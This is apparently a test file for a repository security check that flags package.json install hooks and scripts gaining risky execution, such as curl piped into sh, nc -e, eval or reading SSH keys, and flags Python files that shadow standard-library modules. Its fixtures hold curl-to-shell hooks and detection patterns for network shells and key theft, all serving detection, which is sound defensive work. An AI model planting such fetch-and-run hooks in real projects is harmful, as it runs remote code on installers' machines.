// INDIRECT-EXEC-CHANGE, PROVED ON A REAL PARENT COMMIT
//
// tooling/security/injection/exec-indireto.mjs compares each package.json with
// the first parent of HEAD (a new install hook, a script that gained an
// execution family) and judges every tracked Python file by name (a module or a
// package named like the standard library where a script run by path imports
// it first). These tests build the parent commit explicitly, because a range
// test that reads the wrong parent passes for the wrong reason: every key of a
// manifest compared with an empty parent looks new.
//
//   node --test tooling/security/injection/prove-exec-indireto.mjs

import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import test, { after, describe } from 'node:test'

import { STDLIB_PYTHON, checarIndirectExec, familiasDe } from './exec-indireto.mjs'
import { comandosNomeados } from './instrucoes.mjs'
import { NOME_DA_ALLOWLIST, lerDoPai } from './reader.mjs'

const sha256 = (s) => createHash('sha256').update(s, 'utf8').digest('hex')
const j = (...partes) => partes.join('')
// Execution vocabulary, assembled.
const PIPE_SH = j('| ', 'sh')
const BAIXAR = j('cu', 'rl -s ')

// ----------------------------------------------------------- temp repositories

const criados = []
after(() => {
  for (const dir of criados) rmSync(dir, { recursive: true, force: true, maxRetries: 3 })
})
const SEM_CONFIG = join(tmpdir(), 'rebar-prove-exec-indireto-gitconfig-inexistente')
const AMBIENTE = {
  ...process.env,
  GIT_CONFIG_GLOBAL: SEM_CONFIG,
  GIT_CONFIG_SYSTEM: SEM_CONFIG,
  GIT_CONFIG_COUNT: '1',
  GIT_CONFIG_KEY_0: 'core.excludesFile',
  GIT_CONFIG_VALUE_0: SEM_CONFIG,
  GIT_AUTHOR_NAME: 'proof',
  GIT_AUTHOR_EMAIL: 'proof@example.invalid',
  GIT_COMMITTER_NAME: 'proof',
  GIT_COMMITTER_EMAIL: 'proof@example.invalid',
}
function git(dir, argumentos, entrada) {
  const r = spawnSync('git', ['-c', 'core.protectNTFS=false', ...argumentos], {
    cwd: dir,
    input: typeof entrada === 'string' ? Buffer.from(entrada, 'utf8') : entrada,
    encoding: 'buffer',
    env: AMBIENTE,
    windowsHide: true,
  })
  if (r.status !== 0) throw new Error(`git ${argumentos.join(' ')}: ${r.stderr}`)
  return r.stdout.toString('utf8').trim()
}
/** Writes `arquivos` ({ caminho: texto }) into the index only. */
function gravar(dir, arquivos) {
  const linhas = Object.entries(arquivos).map(([caminho, texto]) => {
    const oid = git(dir, ['hash-object', '-w', '--no-filters', '--stdin'], texto)
    return `100644 ${oid}\t${caminho}\0`
  })
  if (linhas.length) git(dir, ['update-index', '-z', '--add', '--index-info'], linhas.join(''))
}
const commit = (dir, mensagem) =>
  git(dir, ['commit', '-q', '--no-verify', '--allow-empty', '-m', mensagem])

/**
 * The index holds `antes` -> commit c1 -> an empty commit c2 -> `agora` is
 * written into the index. So HEAD^1 is c1, whose tree holds `antes`, and the
 * range the rule judges is exactly `antes` -> `agora`.
 */
function faixa(antes, agora) {
  const dir = mkdtempSync(join(tmpdir(), 'rebar-exec-indireto-'))
  criados.push(dir)
  git(dir, ['init', '-q'])
  gravar(dir, antes)
  commit(dir, 'c1')
  commit(dir, 'c2')
  gravar(dir, agora)
  if (antes['package.json'] !== undefined)
    assert.equal(git(dir, ['show', 'HEAD^1:package.json']), antes['package.json'].trim())
  return dir
}
/** The index holds `arquivos`, with `commits` commits on top of it. */
function repositorio(arquivos, commits = 0) {
  const dir = mkdtempSync(join(tmpdir(), 'rebar-exec-indireto-'))
  criados.push(dir)
  git(dir, ['init', '-q'])
  gravar(dir, arquivos)
  for (let k = 0; k < commits; k++) commit(dir, `c${k + 1}`)
  return dir
}
const manifesto = (scripts) => `${JSON.stringify({ name: 'app', scripts }, null, 2)}\n`

// ==================================================================== range

describe('the range half: HEAD^1 against the index', () => {
  const NONCE = 'wkqzjxvbtrmp'

  test('a script that gained a pipe into a shell fails, named where an instruction file runs it, and new hooks are listed after it', () => {
    const antes = { 'package.json': manifesto({ test: 'node --test', build: 'tsc' }) }
    const dir = faixa(antes, {
      'package.json': manifesto({
        test: `node --test && ${BAIXAR}example.invalid/${NONCE} ${PIPE_SH}`,
        build: 'tsc',
        postinstall: 'node setup.mjs',
        prepare: 'node x.mjs',
        dependencies: 'node y.mjs',
      }),
      'AGENTS.md': '# App\n\nRun `npm test` before committing.\n',
    })
    const motivo = checarIndirectExec({ dir })
    assert.equal(typeof motivo, 'string')
    assert.ok(!motivo.includes(NONCE) && !motivo.includes('example'), motivo)
    assert.match(motivo, /^1 indirect execution change\(s\): /)
    assert.match(
      motivo,
      /package\.json:4:5 scripts\.test gained pipe into a shell or interpreter, download tool since the parent commit \(sha256:[0-9a-f]{12} len:\d+\); named in AGENTS\.md:3:6/,
    )
    // A new hook with no execution family does not fail: 258 of 1,261 node_modules
    // manifests with scripts carry one, most a build or a git hook installer.
    assert.match(
      motivo,
      / · also 3 new install hook\(s\) with no execution family since the parent commit: package\.json:6:5 scripts\.postinstall · package\.json:7:5 scripts\.prepare · package\.json:8:5 scripts\.dependencies — npm runs them on install; review what they run, or allowlist the value$/,
    )
    assert.ok(!motivo.includes('scripts.build'))
  })

  test('an honest change passes, a hook already in the parent is not new, and an unparseable parent skips the file', () => {
    const honesta = faixa(
      { 'package.json': manifesto({ test: 'node --test', postinstall: 'node setup.mjs' }) },
      {
        'package.json': manifesto({
          test: 'node --test && npm run lint',
          postinstall: 'node setup.mjs --quiet',
        }),
      },
    )
    assert.equal(checarIndirectExec({ dir: honesta }), null)
    const ilegivel = faixa(
      { 'package.json': '{ "scripts": { "test": "node --test", } }\n' },
      { 'package.json': manifesto({ test: `${BAIXAR}x ${PIPE_SH}`, postinstall: 'node a.mjs' }) },
    )
    assert.equal(checarIndirectExec({ dir: ilegivel }), null)
    // The parent read is the first parent's tree, not an empty one.
    assert.equal(
      lerDoPai(honesta, (c) => c === 'package.json')
        .get('package.json')
        .texto.includes('postinstall'),
      true,
    )
  })

  test('with no parent the range is not evaluated: na without Python, the static half alone with it', () => {
    const scripts = manifesto({ postinstall: `${BAIXAR}x ${PIPE_SH}` })
    const semCommit = repositorio({ 'package.json': scripts })
    assert.equal(
      lerDoPai(semCommit, () => true),
      null,
    )
    const na = { na: 'no package manifest with a parent commit and no Python file tracked' }
    assert.deepEqual(checarIndirectExec({ dir: semCommit }), na)
    const raiz = repositorio({ 'package.json': scripts }, 1)
    assert.equal(
      lerDoPai(raiz, () => true),
      null,
    )
    assert.deepEqual(checarIndirectExec({ dir: raiz }), na)
    const comPython = repositorio({ 'package.json': scripts, 'tools/run.py': 'print(1)\n' }, 1)
    assert.equal(checarIndirectExec({ dir: comPython }), null)
  })

  test('an accepted script value stays in use one commit later, when the range no longer shows it', () => {
    const valor = `${BAIXAR}x ${PIPE_SH}`
    const linha = JSON.stringify({
      regra: 'indirect-exec-change',
      arquivo: 'package.json',
      ponteiro: '/scripts/setup',
      sha256: sha256(valor),
      motivo: 'reviewed installer',
    })
    const dir = faixa(
      { 'package.json': manifesto({ test: 'node --test' }) },
      {
        'package.json': manifesto({ test: 'node --test', setup: valor }),
        [NOME_DA_ALLOWLIST]: `${linha}\n`,
        '.github/CODEOWNERS': `/${NOME_DA_ALLOWLIST} @owner\n`,
      },
    )
    assert.equal(checarIndirectExec({ dir }), null)
    // Commit the accepted change and add an empty commit: HEAD^1 now holds the
    // value, the range is clean, and the entry must not turn into a stale warning.
    commit(dir, 'c3')
    commit(dir, 'c4')
    // The parent listing is memoized per process; a CI run is a fresh process.
    const pai = lerDoPai(dir, (c) => c === 'package.json', { semMemoria: true })
    assert.ok(
      pai.get('package.json').texto.includes('setup'),
      'HEAD^1 must now hold the accepted value',
    )
    assert.equal(checarIndirectExec({ dir }), null)
  })

  test('a new hook with no family is a nota, a git hook installer is nothing, and one with a family fails', () => {
    const base = { test: 'node --test', build: 'tsc' }
    const antes = { 'package.json': manifesto(base) }
    // One range: the root gains what `npx husky init` writes (it failed as a new
    // hook before) and a new workspace manifest brings a build hook. Only the
    // second is listed, and neither fails.
    assert.deepEqual(
      checarIndirectExec({
        dir: faixa(antes, {
          'package.json': manifesto({ ...base, prepare: 'husky' }),
          'packages/ui/package.json': manifesto({ build: 'tsc', prepare: 'npm run build' }),
        }),
      }),
      {
        nota:
          '1 new install hook(s) with no execution family since the parent commit: ' +
          'packages/ui/package.json:5:5 scripts.prepare — npm runs them on install; review what ' +
          'they run, or allowlist the value',
      },
    )
    assert.match(
      checarIndirectExec({
        dir: faixa(antes, {
          'package.json': manifesto({ ...base, postinstall: `${BAIXAR}x ${PIPE_SH}` }),
        }),
      }),
      /^1 indirect execution change\(s\): package\.json:6:5 scripts\.postinstall gained pipe into a shell or interpreter, download tool since the parent commit \(sha256:[0-9a-f]{12} len:\d+\) and is a new install hook — /,
    )
  })

  test('a manifest past the strict reader is read as npm reads it', () => {
    let fundo = 0
    for (let k = 0; k < 513; k++) fundo = [fundo]
    // npm ran the scripts of a 513-deep manifest; the strict reader refused it and
    // the new postinstall below passed.
    const agora = `${JSON.stringify({ name: 'app', scripts: { test: 'node --test', postinstall: `${BAIXAR}x ${PIPE_SH}` }, x: fundo })}\n`
    const motivo = checarIndirectExec({
      dir: faixa({ 'package.json': manifesto({ test: 'node --test' }) }, { 'package.json': agora }),
    })
    assert.match(
      motivo,
      /^1 indirect execution change\(s\): package\.json:1:1 scripts\.postinstall gained pipe into a shell or interpreter, download tool since the parent commit/,
    )
  })

  test('with no parent, an accepted script still counts as in use: no stale-entry nota', () => {
    const valor = 'node scripts/setup.mjs'
    const linha = JSON.stringify({
      regra: 'indirect-exec-change',
      arquivo: 'package.json',
      ponteiro: '/scripts/postinstall',
      sha256: sha256(valor),
      motivo: 'reviewed setup',
    })
    const arquivos = {
      'package.json': manifesto({ postinstall: valor }),
      [NOME_DA_ALLOWLIST]: `${linha}\n`,
    }
    // A root commit and a shallow clone have no parent. Before, this entry was
    // reported as matching nothing, and deleting it failed the next full clone.
    // The only nota left is ownership, the same with a parent or without one.
    const nota = {
      nota: `no CODEOWNERS entry owns ${NOME_DA_ALLOWLIST}, so any pull request can widen what it exempts`,
    }
    assert.deepEqual(checarIndirectExec({ dir: repositorio(arquivos, 1) }), nota)
    assert.deepEqual(checarIndirectExec({ dir: faixa(arquivos, arquivos) }), nota)
  })
})

// =================================================================== static

describe('the static half: Python files named like the standard library', () => {
  test('a module in a folder without __init__.py fails; inside a package it passes; the root is named', () => {
    const dir = repositorio({
      'scripts/json.py': 'X = 1\n',
      'scripts/run.py': 'import json\n',
      'random.py': 'X = 1\n',
      'pkg/__init__.py': '',
      'pkg/logging.py': 'X = 1\n',
      // Names nothing can shadow are left out of the list: loaded before the
      // script, frozen, or compiled into every interpreter.
      'tools/os.py': 'X = 1\n',
      'tools/time.py': 'X = 1\n',
    })
    assert.equal(
      checarIndirectExec({ dir }),
      '2 indirect execution change(s): random.py can shadow the standard library module random when a script in the repository root is run by path · ' +
        'scripts/json.py can shadow the standard library module json when a script in scripts/ is run by path — ' +
        'an agent told to run the project scripts runs this too; rename the Python file or add the __init__.py of a package, or allowlist it with a reason',
    )
  })

  test('a package named like the standard library fails where its parent is no package, and the allowlist takes its __init__.py', () => {
    const arquivos = {
      'logging/__init__.py': 'X = 1\n',
      'app/__init__.py': '',
      'app/email/__init__.py': 'X = 1\n',
      '.github/CODEOWNERS': `/${NOME_DA_ALLOWLIST} @owner\n`,
    }
    const dir = repositorio(arquivos)
    assert.match(
      checarIndirectExec({ dir }),
      /^1 indirect execution change\(s\): logging\/ can shadow the standard library package logging when a script in the repository root is run by path — /,
    )
    const oid = git(dir, ['ls-files', '-s', '--', 'logging/__init__.py']).split(' ')[1]
    const linha = JSON.stringify({
      regra: 'indirect-exec-change',
      arquivo: 'logging/__init__.py',
      oid,
      motivo: 'vendored',
    })
    assert.equal(
      checarIndirectExec({ dir: repositorio({ ...arquivos, [NOME_DA_ALLOWLIST]: `${linha}\n` }) }),
      null,
    )
  })

  test('every suffix the import system loads counts, a symlink counts by its path, and __pycache__ does not', () => {
    const dir = repositorio({
      'a/json.pyw': 'X = 1\n',
      'b/json.pyc': 'x',
      'c/json.cp312-win_amd64.pyd': 'x',
      'd/json.cpython-312-x86_64-linux-gnu.so': 'x',
      'e/json.abi3.so': 'x',
      'f/__init__.pyc': 'x',
      'f/json.py': 'X = 1\n',
      'g/__pycache__/json.cpython-312.pyc': 'x',
      'h/json.txt': 'x',
    })
    // A 120000 entry: on Windows git checks it out as a file holding the target
    // path, and Python imported that file in place of json.
    const oid = git(dir, ['hash-object', '-w', '--no-filters', '--stdin'], '../a/json.pyw')
    git(dir, ['update-index', '-z', '--add', '--index-info'], `120000 ${oid}\ti/json.py\0`)
    const motivo = checarIndirectExec({ dir })
    for (const caminho of [
      'a/json.pyw',
      'b/json.pyc',
      'c/json.cp312-win_amd64.pyd',
      'd/json.cpython-312-x86_64-linux-gnu.so',
      'e/json.abi3.so',
      'i/json.py',
    ])
      assert.ok(motivo.includes(`${caminho} can shadow the standard library module json`), caminho)
    assert.match(motivo, /^6 indirect execution change\(s\): /)
  })

  test('a Python name is accepted by its path, which survives an edit of the file', () => {
    // CircuitPython runs code.py by name, so renaming is no remedy; an entry keyed
    // by blob id was lost on every commit that edited the file.
    const linha = JSON.stringify({
      regra: 'indirect-exec-change',
      arquivo: 'code.py',
      ponteiro: '',
      sha256: sha256('code.py'),
      motivo: 'CircuitPython runs code.py by name',
    })
    const base = {
      [NOME_DA_ALLOWLIST]: `${linha}\n`,
      '.github/CODEOWNERS': `/${NOME_DA_ALLOWLIST} @o\n`,
    }
    // The key names no content, so any version of the file is accepted.
    assert.equal(
      checarIndirectExec({ dir: repositorio({ ...base, 'code.py': 'import board\nprint(2)\n' }) }),
      null,
    )
  })

  test('the name list: 212 names of Python 3.12 without an underscore, minus the 21 no file can shadow', () => {
    assert.equal(STDLIB_PYTHON.length, 191)
    const fora =
      'abc builtins codecs encodings genericpath io marshal ntpath os site stat sys time zipimport posixpath runpy atexit errno faulthandler gc itertools'
    for (const nome of fora.split(' ')) assert.ok(!STDLIB_PYTHON.includes(nome), nome)
    for (const nome of [
      'json',
      'logging',
      'math',
      'array',
      'zlib',
      'msvcrt',
      'winreg',
      'nt',
      'posix',
    ])
      assert.ok(STDLIB_PYTHON.includes(nome), nome)
  })
})

// ================================================================= helpers

describe('helpers', () => {
  test('the execution families, by label', () => {
    assert.deepEqual(familiasDe(`a ${PIPE_SH}`), ['pipe into a shell or interpreter'])
    assert.deepEqual(familiasDe(j('cat x | no', 'de')), ['pipe into a shell or interpreter'])
    assert.deepEqual(familiasDe(j('wg', 'et x')), ['download tool'])
    assert.deepEqual(familiasDe(j('echo $', '(id)')), ['command substitution'])
    assert.deepEqual(familiasDe(j('echo ', '`id`')), ['command substitution'])
    assert.deepEqual(familiasDe(j('n', 'c -e x')), ['network listener'])
    assert.deepEqual(familiasDe(j('cat ~/.s', 'sh/k')), ['SSH key path'])
    assert.deepEqual(familiasDe(j('open ', 'https://x')), ['URL'])
    assert.deepEqual(familiasDe(j('ev', 'al "$X"')), ['eval'])
    assert.deepEqual(familiasDe(j('node -e "ev', 'al(x)"')), ['eval'])
    // The word is no eval, and a local dev server is no download.
    assert.deepEqual(familiasDe(j('promptfoo ev', 'al -c p.yaml')), [])
    assert.deepEqual(familiasDe(j('node scripts/ev', 'al.mjs && vitest run ev', 'al/')), [])
    assert.deepEqual(
      familiasDe(j('wait-on http:', '//localhost:3000 && x http:', '//127.0.0.1:8080/')),
      [],
    )
    assert.deepEqual(familiasDe(j('x http:', '//localhost.example.invalid/')), ['URL'])
    assert.deepEqual(familiasDe(j('base', '64 -d f')), ['base64 decode'])
    assert.deepEqual(familiasDe('node --test && npm run lint || tsc'), [])
    assert.deepEqual(familiasDe(undefined), [])
  })

  test('the scripts an instruction text names', () => {
    const nomes = (s) => comandosNomeados(s).map((x) => x.script)
    assert.deepEqual(nomes('Run `npm test`, then npm run verificar and pnpm build.'), [
      'test',
      'verificar',
      'build',
    ])
    assert.deepEqual(nomes('yarn lint. bun run dev: npm t'), ['lint', 'dev', 'test'])
    assert.deepEqual(nomes('npm install && npm ci && npx x && npm run install'), ['install'])
  })
})
